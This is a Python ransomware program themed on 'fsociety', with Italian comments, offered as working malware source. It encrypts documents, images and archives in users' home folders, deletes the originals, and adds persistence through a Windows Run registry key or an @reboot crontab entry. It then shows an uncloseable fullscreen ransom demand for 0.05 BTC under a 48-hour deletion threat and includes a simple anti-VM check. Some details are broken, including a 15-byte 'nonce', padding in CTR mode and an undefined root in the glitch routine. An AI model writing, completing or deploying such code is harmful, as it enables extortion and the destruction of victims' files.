import os
import sys
import time
import json
import base64
import shutil
import threading
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import tkinter as tk
from tkinter import ttk, messagebox
from PIL import Image, ImageTk, ImageDraw, ImageFont
import platform
import subprocess
import socket
import getpass

class FsocietyRansomware:
    def __init__(self):
        self.backend = default_backend()
        self.key = None
        self.nonce = b'fsociety1234567'  # 16 bytes fixed nonce
        self.victim_id = self.generate_victim_id()
        self.encrypted_count = 0
        self.target_extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', 
            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp3', '.mp4',
            '.avi', '.mov', '.zip', '.rar', '.txt', '.rtf', '.psd'
        ]
        self.setup_persistence()
        self.generate_key()
        self.encrypt_files()
        self.show_ransom_screen()

    def generate_victim_id(self):
        """Genera ID univoco vittima"""
        hostname = socket.gethostname()
        user = getpass.getuser()
        return f"FSOC-{hash(hostname+user) % 1000000:06d}"

    def generate_key(self):
        """Genera chiave AES-256"""
        password = b"fsociety_master_key_2024"
        salt = b'fsociety_salt_666'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        self.key = base64.urlsafe_b64encode(kdf.derive(password))
        # Salva chiave per decifratura (sistemata da te)
        self.save_decryption_key()

    def save_decryption_key(self):
        """Salva chiave decifratura in posizione sicura"""
        key_data = {
            "victim_id": self.victim_id,
            "aes_key": base64.b64encode(self.key).decode(),
            "nonce": base64.b64encode(self.nonce).decode()
        }
        dek_path = os.path.expanduser("~/.fsociety_dek.json")
        with open(dek_path, 'w') as f:
            json.dump(key_data, f)
        os.chmod(dek_path, 0o600)

    def pad(self, data):
        """Padding PKCS7"""
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        return padded_data

    def encrypt_file(self, file_path):
        """Cifra singolo file"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Padding
            padded_data = self.pad(data)
            
            # AES-CTR
            iv = self.nonce
            cipher = Cipher(
                algorithms.AES(self.key),
                modes.CTR(iv),
                backend=self.backend
            )
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            # Scrivi file cifrato
            encrypted_path = file_path + '.fsociety'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Elimina originale
            os.remove(file_path)
            self.encrypted_count += 1
            return True
        except:
            return False

    def get_target_paths(self):
        """Trova percorsi da cifrare"""
        paths = []
        system = platform.system().lower()
        
        if system == "windows":
            paths = [
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Downloads"),
                "C:\\Users\\Public\\",
                os.path.expanduser("~/Pictures")
            ]
        else:  # Linux/Mac
            paths = [
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Downloads"),
                os.path.expanduser("~/Pictures"),
                "/home"
            ]
        
        return [p for p in paths if os.path.exists(p)]

    def encrypt_files(self):
        """Cifra tutti i file target"""
        print("[+] Inizio cifratura...")
        target_paths = self.get_target_paths()
        
        for base_path in target_paths:
            for root, dirs, files in os.walk(base_path):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for file in files:
                    if any(file.lower().endswith(ext) for ext in self.target_extensions):
                        file_path = os.path.join(root, file)
                        if self.encrypt_file(file_path):
                            print(f"[+] Cifrato: {file_path}")
        
        print(f"[+] Cifratura completata: {self.encrypted_count} file")

    def setup_persistence(self):
        """Persistenza sistema"""
        system = platform.system().lower()
        if system == "windows":
            self.setup_windows_persistence()
        else:
            self.setup_linux_persistence()

    def setup_windows_persistence(self):
        """Persistenza Windows"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Fsociety /t REG_SZ /d "{script_path}" /f'
            subprocess.run(reg_cmd, shell=True, capture_output=True)
        except:
            pass

    def setup_linux_persistence(self):
        """Persistenza Linux"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            cron_job = f"@reboot python3 {script_path}\n"
            subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -", shell=True)
        except:
            pass

    def create_fsociety_screen(self, root):
        """Crea schermata stile fsociety"""
        root.title("fsociety - 0.2.4")
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        root.attributes('-topmost', True)
        
        # Canvas principale
        canvas = tk.Canvas(root, width=1920, height=1080, bg='black', highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        
        # Immagine sfondo glitch
        self.create_glitch_background(canvas)
        
        # Titolo fsociety
        title = canvas.create_text(960, 200, text="fsociety", 
                                  font=("Courier", 72, "bold"), fill="#00ff00")
        
        # Versione
        version = canvas.create_text(960, 280, text="0.2.4", 
                                    font=("Courier", 24), fill="#00ff00")
        
        # Messaggio ransomware
        msg1 = canvas.create_text(960, 450, text="I TUOI FILE SONO CIFRATI!", 
                                 font=("Courier", 36, "bold"), fill="#ff0000")
        
        msg2 = canvas.create_text(960, 520, text=f"VICTIM ID: {self.victim_id}", 
                                 font=("Courier", 24), fill="#ffff00")
        
        msg3 = canvas.create_text(960, 580, text="File cifrati: {}".format(self.encrypted_count), 
                                 font=("Courier", 20), fill="#00ff00")
        
        # Istruzioni pagamento
        pay1 = canvas.create_text(960, 680, text="PAGA 0.05 BTC", 
                                 font=("Courier", 32, "bold"), fill="#ffaa00")
        
        pay2 = canvas.create_text(960, 730, text="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", 
                                 font=("Courier", 20), fill="#ffffff")
        
        pay3 = canvas.create_text(960, 780, text="48h o file cancellati PER SEMPRE", 
                                 font=("Courier", 24, "bold"), fill="#ff0000")
        
        # Contatti
        contact = canvas.create_text(960, 880, text="fsociety@protonmail.com", 
                                    font=("Courier", 18), fill="#00ff00")
        
        # Effetto glitch
        self.start_glitch_effect(canvas, [title, msg1, pay1])

    def create_glitch_background(self, canvas):
        """Sfondo glitch effect"""
        for i in range(0, 1920, 20):
            for j in range(0, 1080, 30):
                color = "#{:06x}".format(hash(f"{i}{j}") % 0xFFFFFF)
                canvas.create_rectangle(i, j, i+20, j+30, fill=color, outline="")

    def start_glitch_effect(self, canvas, elements):
        """Effetto glitch continuo"""
        def glitch():
            for elem in elements:
                x = canvas.coords(elem)[0] + (hash(time.time()) % 10 - 5)
                canvas.coords(elem, x, canvas.coords(elem)[1])
            root.after(100, glitch)
        glitch()

    def show_ransom_screen(self):
        """Mostra schermata ransomware"""
        self.root = tk.Tk()
        self.create_fsociety_screen(self.root)
        
        # Blocca input
        self.root.bind('<Escape>', lambda e: None)
        self.root.bind('<Alt-F4>', lambda e: None)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Loop principale
        self.root.mainloop()

def main():
    """Entry point"""
    if getattr(sys, 'frozen', False):
        # Eseguito come executable
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))
    
    # Anti-VM base
    if 'debug' in sys.modules or os.getenv('VIRTUAL_ENV'):
        sys.exit(0)
    
    ransomware = FsocietyRansomware()

if __name__ == "__main__":
    main()
